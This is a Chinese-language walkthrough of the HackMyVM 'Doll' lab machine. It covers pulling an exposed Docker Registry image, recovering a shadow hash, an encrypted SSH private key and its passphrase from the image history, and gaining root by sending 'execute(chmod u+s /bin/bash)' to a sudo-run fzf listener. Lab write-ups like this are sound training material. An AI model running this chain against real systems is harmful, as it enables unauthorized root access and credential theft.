# hmv_Doll

# 0.闲聊

![image](assets/image-20250129201949-6vewhf4.png)

**靶机：** https://hackmyvm.eu/machines/machine.php?vm=Doll

**靶机 IP：** 192.168.72.129

**kali IP：** 192.168.72.128

今天年初二，有点空，更新一下wp

# 1.扫描

​`nmap`​开扫

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sS -Pn -n -p- --min-rate 10000 192.168.72.129
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:16 EST
Nmap scan report for 192.168.72.129
Host is up (0.00020s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
1007/tcp open  unknown
MAC Address: 08:00:27:F7:F4:53 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.19 seconds
                                                                  
```

其中`1007`​不知道是什么服务，我们详细扫描一下

```
┌──(kali㉿kali)-[~/test]
└─$ nmap -sT -sV -Pn -n -p1007 192.168.72.129        
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 20:17 EST
Nmap scan report for 192.168.72.129
Host is up (0.00039s latency).

PORT     STATE SERVICE VERSION
1007/tcp open  http    Docker Registry (API: 2.0)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.26 seconds

```

不知道是什么东西，我们等会搜索一下

# 2.踩点

在**hacktricks**​上找到[5000 - Pentesting Docker Registry](https://book.hacktricks.wiki/zh/network-services-pentesting/5000-pentesting-docker-registry.html)这篇文章

![image](assets/image-20250129202845-u4dct3k.png)

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/_catalog
{"repositories":["dolly"]}
                              
```

继续利用

```
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/dolly/tags/list
{"name":"dolly","tags":["latest"]}
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ curl http://192.168.72.129:1007/v2/dolly/manifests/latest
{
   "schemaVersion": 1,
   "name": "dolly",
   "tag": "latest",
   "architecture": "amd64",
   "fsLayers": [
      {
         "blobSum": "sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4"
      },
      {
         "blobSum": "sha256:f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09"
      }
   ],
   "history": [
      {
         "v1Compatibility": "{\"architecture\":\"amd64\",\"config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"container\":\"10ddd4608cdfd81cd95111ecfa37499635f430b614fa326a6526eef17a215f06\",\"container_config\":{\"Hostname\":\"10ddd4608cdf\",\"Domainname\":\"\",\"User\":\"\",\"AttachStdin\":true,\"AttachStdout\":true,\"AttachStderr\":true,\"Tty\":true,\"OpenStdin\":true,\"StdinOnce\":true,\"Env\":[\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\"],\"Cmd\":[\"/bin/sh\"],\"Image\":\"doll\",\"Volumes\":null,\"WorkingDir\":\"\",\"Entrypoint\":null,\"OnBuild\":null,\"Labels\":{}},\"created\":\"2023-04-25T08:58:11.460540528Z\",\"docker_version\":\"23.0.4\",\"id\":\"89cefe32583c18fc5d6e6a5ffc138147094daac30a593800fe5b6615f2d34fd6\",\"os\":\"linux\",\"parent\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\"}"
      },
      {
         "v1Compatibility": "{\"id\":\"1430f49318669ee82715886522a2f56cd3727cbb7cb93a4a753512e2ca964a15\",\"parent\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"comment\":\"buildkit.dockerfile.v0\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"ARG passwd=devilcollectsit\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"638e8754ced32813bcceecce2d2447a00c23f68c21ff2d7d125e40f1e65f1a89\",\"parent\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.45578926Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop)  CMD [\\\"/bin/sh\\\"]\"]},\"throwaway\":true}"
      },
      {
         "v1Compatibility": "{\"id\":\"cf9a548b5a7df66eda1f76a6249fa47037665ebdcef5a98e7552149a0afb7e77\",\"created\":\"2023-03-29T18:19:24.348438709Z\",\"container_config\":{\"Cmd\":[\"/bin/sh -c #(nop) ADD file:9a4f77dfaba7fd2aa78186e4ef0e7486ad55101cefc1fabbc1b385601bb38920 in / \"]}}"
      }
   ],
   "signatures": [
      {
         "header": {
            "jwk": {
               "crv": "P-256",
               "kid": "X7W5:IVTA:CKTP:A6JJ:IMVJ:FOTQ:OO4M:CB4C:6JYB:PX6R:DQ6C:JPGS",
               "kty": "EC",
               "x": "m6jL0NHxYkVUo0-ID-HLzT0Y3OqOeOBvekpF98kC-4c",
               "y": "WlToBayTJ8f4zcry3wiq1fMvedgRkuwE7Oycza83_YA"
            },
            "alg": "ES256"
         },
         "signature": "n75fkjkUhAvtqrT2JfMVuBUtIUgiZ0ZhgYmM4m9kqOHprKnq7YrMyNKYYTntkxDmN2uW2w_3o36LvmRW7KzyOg",
         "protected": "eyJmb3JtYXRMZW5ndGgiOjI4MjksImZvcm1hdFRhaWwiOiJDbjAiLCJ0aW1lIjoiMjAyNS0wMS0zMFQwMToyOTo0NVoifQ"
      }
   ]
}                                                                                                                                     

┌──(kali㉿kali)-[~/test]
└─$ mkdir tmp     
                                                                                                                                     
┌──(kali㉿kali)-[~/test]
└─$ cd tmp 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ curl http://192.168.72.129:1007/v2/dolly/blobs/sha256:5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017 -o blob1.tar
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3707  100  3707    0     0   971k      0 --:--:-- --:--:-- --:--:-- 1206k
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ tar -xf blob1.tar
                         
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 24
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
drwx------ 2 kali kali 4096 2023年 4月25日 root
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd etc 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ ls -al
总计 32
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
-rw-r--r-- 1 kali kali  710 2023年 4月25日 group
-rw-r--r-- 1 kali kali  697 2022年11月 4日 group-
-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd
-rw-r--r-- 1 kali kali 1223 2023年 4月25日 passwd-
-rw-r----- 1 kali kali  553 2023年 4月25日 shadow
-rw-r----- 1 kali kali  448 2023年 4月25日 shadow-
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ cat *   
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
bela:x:1000:
root:x:0:root
bin:x:1:root,bin,daemon
daemon:x:2:root,bin,daemon
sys:x:3:root,bin,adm
adm:x:4:root,adm,daemon
tty:x:5:
disk:x:6:root,adm
lp:x:7:lp
mem:x:8:
kmem:x:9:
wheel:x:10:root
floppy:x:11:root
mail:x:12:mail
news:x:13:news
uucp:x:14:uucp
man:x:15:man
cron:x:16:cron
console:x:17:
audio:x:18:
cdrom:x:19:
dialout:x:20:root
ftp:x:21:
sshd:x:22:
input:x:23:
at:x:25:at
tape:x:26:root
video:x:27:root
netdev:x:28:
readproc:x:30:
squid:x:31:squid
xfs:x:33:xfs
kvm:x:34:kvm
games:x:35:
shadow:x:42:
cdrw:x:80:
www-data:x:82:
usb:x:85:
vpopmail:x:89:
users:x:100:games
ntp:x:123:
nofiles:x:200:
smmsp:x:209:smmsp
locate:x:245:
abuild:x:300:
utmp:x:406:
ping:x:999:
nogroup:x:65533:
nobody:x:65534:
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
bela:x:1000:1000:Linux User,,,:/home/bela:/bin/ash
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:$6$azVVFjn.mkvh.lhA$yAXPBGOZDXRdDBmn3obtzhUzxwfDD7u3YIcixohpKzTGpJS0Oeu7UVoguhmwg4DHNM8K5z7Tn93BBaDadM/A5.:19472:0:99999:7:::
root:*::0:::::
bin:!::0:::::
daemon:!::0:::::
adm:!::0:::::
lp:!::0:::::
sync:!::0:::::
shutdown:!::0:::::
halt:!::0:::::
mail:!::0:::::
news:!::0:::::
uucp:!::0:::::
operator:!::0:::::
man:!::0:::::
postmaster:!::0:::::
cron:!::0:::::
ftp:!::0:::::
sshd:!::0:::::
at:!::0:::::
squid:!::0:::::
xfs:!::0:::::
games:!::0:::::
cyrus:!::0:::::
vpopmail:!::0:::::
ntp:!::0:::::
smmsp:!::0:::::
guest:!::0:::::
nobody:!::0:::::
bela:!:19472:0:99999:7:::
                                 
┌──(kali㉿kali)-[~/test/tmp/etc]
└─$ cd ..                                
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls la 
ls: 无法访问 'la': 没有那个文件或目录
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ ls -la
总计 24
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 .
drwxrwxr-x 4 kali kali 4096  1月29日 20:32 ..
-rw-rw-r-- 1 kali kali 3707  1月29日 20:32 blob1.tar
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 etc
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 home
drwx------ 2 kali kali 4096 2023年 4月25日 root
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp]
└─$ cd home 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ ls -al
总计 12
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 .
drwxrwxr-x 5 kali kali 4096  1月29日 20:32 ..
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 bela
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home]
└─$ cd bela 
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ l -al 
总计 16
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ./
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ../
-rw------- 1 kali kali   57 2023年 4月25日 .ash_history
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .ssh/
-rwxr-xr-x 1 kali kali    0 1969年12月31日 .wh..wh..opq*
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cat .ash_history                     
pwd
ls -la
mkdir .ssh
cd .ssh
nano id_rsa
vi id_rsa
exit
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cat .wh..wh..opq
                                                                                                                                     
┌──(kali㉿kali)-[~/test/tmp/home/bela]
└─$ cd .ssh       
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ls -al
总计 12
drwxr-xr-x 2 kali kali 4096 2023年 4月25日 .
drwxr-xr-x 3 kali kali 4096 2023年 4月25日 ..
-rw-r--r-- 1 kali kali 2635 2023年 4月25日 id_rsa
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ cat id_rsa    
-----BEGIN OPENSSH PRIVATE KEY-----
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
VtVwCw==
-----END OPENSSH PRIVATE KEY-----
                                             
```

省了，都不用爆破shadow了

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh2john id_rsa > hash
                                         
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Created directory: /home/kali/.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:24 0.05% (ETA: 2025-01-31 17:41) 0g/s 105.4p/s 105.4c/s 105.4C/s passat..kicker
0g 0:00:01:39 0.06% (ETA: 2025-01-31 17:26) 0g/s 105.9p/s 105.9c/s 105.9C/s strokes..jhoan

```

爆破不出来，不会是用这个吧

![image](assets/image-20250129204242-qkg0s6r.png)

试试

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ chmod 600 id_rsa 

┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa
ssh: connect to host 192.168.72.129 port 22: No route to host
                                                                                                                                     
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Apr 25 10:35:13 2023 from 192.168.0.100
bela@doll:~$ id
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

# 3.提权

```
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337

```

​`fzf`​ 是一个交互式命令行模糊查找工具，并且其 `--listen`​ 选项允许它接收来自远程连接的命令。`fzf`​ 支持 `execute`​ 绑定，我们可以通过它来执行任意命令，包括启动 `bash`​ 或 `sh`​ 以获取 root shell。

```
bela@doll:~$ sudo /usr/bin/fzf --listen=1337
```

去重新登录一个窗口

```
┌──(kali㉿kali)-[~/…/tmp/home/bela/.ssh]
└─$ ssh bela@192.168.72.129 -i id_rsa   
Enter passphrase for key 'id_rsa': 
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jan 30 02:44:26 2025 from 192.168.72.128

bela@doll:~$ curl -X POST --data '{"call":"execute","args":["chmod u+s /bin/bash"]}' http://127.0.0.1:1337
unknown action: {"call":"execute","args":["/bin/bash"]}
bela@doll:~$ curl -X POST --data 'execute(chmod u+s /bin/bash)' http://127.0.0.1:1337

```

成功拿到root shell

```
bela@doll:~$ bash -p
bash-5.1# id
uid=1000(bela) gid=1000(bela) euid=0(root) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)

```

‍